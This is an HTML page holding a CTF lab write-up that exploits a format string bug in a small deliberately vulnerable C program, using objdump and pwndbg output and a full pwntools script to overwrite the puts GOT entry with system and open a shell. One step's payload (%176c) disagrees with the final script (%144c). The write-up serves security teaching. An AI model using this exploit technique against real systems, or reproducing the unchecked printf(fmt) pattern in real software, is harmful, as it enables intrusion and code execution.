<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Simple PWN - 0x11(format string bug)
  #


  tags: CTF PWN eductf
  #


  format string bug background
  #

printf %n


  Original Code
  #

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    char fmt[0x20];

    system(&#34;echo 'Give me fmt: '&#34;);
    read(0, fmt, 0x20);
    printf(fmt);

    system(&#34;echo 'Give me string: '&#34;);
    read(0, fmt, 0x20);
    puts(fmt);

    return 0;
}
$ gcc -o fmt fmt.c -no-pie -fno-stack-protector -z norelro -zexecstack

In this problem, we can consider to use format string bug to achieve GOT hijacking without buffer overflow.
The main idea is totally the same as GOT hijacking lecture
Thus, we can observe which function can be overlapped by system plt → puts function

Because&mldr;
puts just needs one argument like system function, but how about printf?
Unfortunately, it appeared before 2nd read function, because 2nd read needs to store the argument for system function such as sh\x00.




  Exploit - GOT hijacking + format string bug
  #

Our goal is hijack puts GOT to system plt"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple PWN - 0x11(format string bug)"><meta property="og:description" content="Simple PWN - 0x11(format string bug) # tags: CTF PWN eductf # format string bug background # printf %n Original Code # #include <stdio.h> #include <unistd.h> #include <stdlib.h> int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); char fmt[0x20]; system(&#34;echo 'Give me fmt: '&#34;); read(0, fmt, 0x20); printf(fmt); system(&#34;echo 'Give me string: '&#34;); read(0, fmt, 0x20); puts(fmt); return 0; } $ gcc -o fmt fmt.c -no-pie -fno-stack-protector -z norelro -zexecstack In this problem, we can consider to use format string bug to achieve GOT hijacking without buffer overflow. The main idea is totally the same as GOT hijacking lecture Thus, we can observe which function can be overlapped by system plt → puts function Because… puts just needs one argument like system function, but how about printf? Unfortunately, it appeared before 2nd read function, because 2nd read needs to store the argument for system function such as sh\x00. Exploit - GOT hijacking + format string bug # Our goal is hijack puts GOT to system plt"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><meta property="article:tag" content="Eductf"><title>Simple PWN - 0x11(format string bug) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple PWN - 0x11(format string bug)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#format-string-bug-background>format string bug background</a></li><li><a href=#original-code>Original Code</a></li><li><a href=#exploit---got-hijacking--format-string-bug>Exploit - GOT hijacking + format string bug</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-pwn---0x11format-string-bug>Simple PWN - 0x11(format string bug)
<a class=anchor href=#simple-pwn---0x11format-string-bug>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><h2 id=format-string-bug-background>format string bug background
<a class=anchor href=#format-string-bug-background>#</a></h2><p><a href=https://www.geeksforgeeks.org/g-fact-31/>printf %n</a>
<img src=https://media.geeksforgeeks.org/wp-content/cdn-uploads/20191009172738/n-in-printf.jpg alt></p><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><pre tabindex=0><code class="language-cpp!=" data-lang="cpp!=">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    char fmt[0x20];

    system(&#34;echo &#39;Give me fmt: &#39;&#34;);
    read(0, fmt, 0x20);
    printf(fmt);

    system(&#34;echo &#39;Give me string: &#39;&#34;);
    read(0, fmt, 0x20);
    puts(fmt);

    return 0;
}
</code></pre><pre tabindex=0><code class=language-bash! data-lang=bash!>$ gcc -o fmt fmt.c -no-pie -fno-stack-protector -z norelro -zexecstack
</code></pre><ul><li>In this problem, we can consider to use <code>format string bug</code> to achieve <code>GOT hijacking</code> without buffer overflow.</li><li><strong>The main idea is totally the same as <a href=https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/S1BBpSR5s>GOT hijacking lecture</a></strong></li><li>Thus, we can observe which function can be overlapped by <code>system plt</code> → <font color=FF0000><strong><code>puts function</code></strong></font><ul><li>Because&mldr;
<code>puts</code> just needs one argument like <code>system</code> function, but how about <code>printf</code>?
Unfortunately, it appeared before 2nd read function, because 2nd <code>read</code> needs to store the argument for <code>system</code> function such as <code>sh\x00</code>.</li></ul></li></ul><h2 id=exploit---got-hijacking--format-string-bug>Exploit - GOT hijacking + format string bug
<a class=anchor href=#exploit---got-hijacking--format-string-bug>#</a></h2><p><strong>Our goal is hijack <code>puts GOT</code> to <code>system plt</code></strong></p><ol><li><p>Find <code>puts GOT</code> address and <code>system plt</code> → <font color=FF0000><code>0x403318</code> and <code>0x401090</code></font></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ objdump -d fmt
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span><span style=color:#ae81ff>0000000000401090</span> &lt;system@plt&gt;:
</span></span><span style=display:flex><span>  401090:       f3 0f 1e fa             endbr64
</span></span><span style=display:flex><span>  401094:       f2 ff <span style=color:#ae81ff>25</span> <span style=color:#ae81ff>85</span> <span style=color:#ae81ff>22</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>    bnd jmp *0x2285<span style=color:#f92672>(</span>%rip<span style=color:#f92672>)</span> <span style=color:#75715e># 403320 &lt;system@GLIBC_2.2.5&gt;</span>
</span></span><span style=display:flex><span>  40109b:       0f 1f <span style=color:#ae81ff>44</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>          nopl   0x0<span style=color:#f92672>(</span>%rax,%rax,1<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>$ gdb fmt
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>pwndbg&gt; attach &lt;PID&gt;
</span></span><span style=display:flex><span>pwndbg&gt; got
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>GOT protection: No RELRO | GOT functions: <span style=color:#ae81ff>5</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>0x403318<span style=color:#f92672>]</span> puts@GLIBC_2.2.5 -&gt; 0x401030 ◂— endbr64
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>0x403320<span style=color:#f92672>]</span> system@GLIBC_2.2.5 -&gt; 0x7f87de291d60 <span style=color:#f92672>(</span>system<span style=color:#f92672>)</span> ◂— endbr64
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>0x403328<span style=color:#f92672>]</span> printf@GLIBC_2.2.5 -&gt; 0x401050 ◂— endbr64
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>0x403330<span style=color:#f92672>]</span> read@GLIBC_2.2.5 -&gt; 0x7f87de355980 <span style=color:#f92672>(</span>read<span style=color:#f92672>)</span> ◂— endbr64
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>0x403338<span style=color:#f92672>]</span> setvbuf@GLIBC_2.2.5 -&gt; 0x7f87de2c2670 <span style=color:#f92672>(</span>setvbuf<span style=color:#f92672>)</span> ◂— endbr64
</span></span><span style=display:flex><span>...
</span></span></code></pre></div></li><li><p>Construct format string - try and error</p><pre tabindex=0><code class=language-python! data-lang=python!>r.sendafter(&#34;Give me fmt: &#34;, b&#34;%176c%8$hhn&#34; + b&#34;aaaaa&#34; + p64(puts_got))
</code></pre><p><strong>從結果來看比較清楚</strong>
<img src=https://imgur.com/G4YPrXO.png alt></p><ul><li>Parse <code>b"%176c%8$hhn" + b"aaaaa" + p64(puts_got)</code>
Our goal is overlap <code>puts GOT</code>, so we put address of puts_got at final position, that is <code>[%rsp + 16]</code>(format string: <code>$8</code>)
We want to modify <code>0x401030</code> to <code>0x401090</code>, so we just modify only <strong>1 bytes</strong>(format string: <code>%hhn</code>). In addition, <font color=FF0000><code>0x90</code> is 144</font> as decimal.(format string: <code>%176c</code>)
Combine all format sting: <code>%176c%8$hhn</code> and other space can pad trash bytes</li></ul></li><li><p>Pass the command to <code>system</code> function - <code>sh\x00</code> to open shell</p><pre tabindex=0><code class=language-python! data-lang=python!>r.sendafter(&#34;Give me string: &#34;, &#34;sh\x00&#34;)
</code></pre></li><li><p>Finally, we got shell!!!
<img src=https://imgur.com/Zh5jE4N.png alt></p></li></ol><ul><li>Whole exploit<pre tabindex=0><code class=language-python! data-lang=python!>from pwn import *

context.arch = &#39;amd64&#39;

r = process(&#34;./fmt&#34;)
raw_input()

puts_got = 0x403318
system_plt = 0x401090

r.sendafter(&#34;Give me fmt: &#34;, b&#34;%144c%8$hhn&#34; + b&#34;aaaaa&#34; + p64(puts_got))
r.sendafter(&#34;Give me string: &#34;, &#34;sh\x00&#34;)

r.interactive()
</code></pre></li></ul></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#format-string-bug-background>format string bug background</a></li><li><a href=#original-code>Original Code</a></li><li><a href=#exploit---got-hijacking--format-string-bug>Exploit - GOT hijacking + format string bug</a></li></ul></nav></div></aside></main></body></html>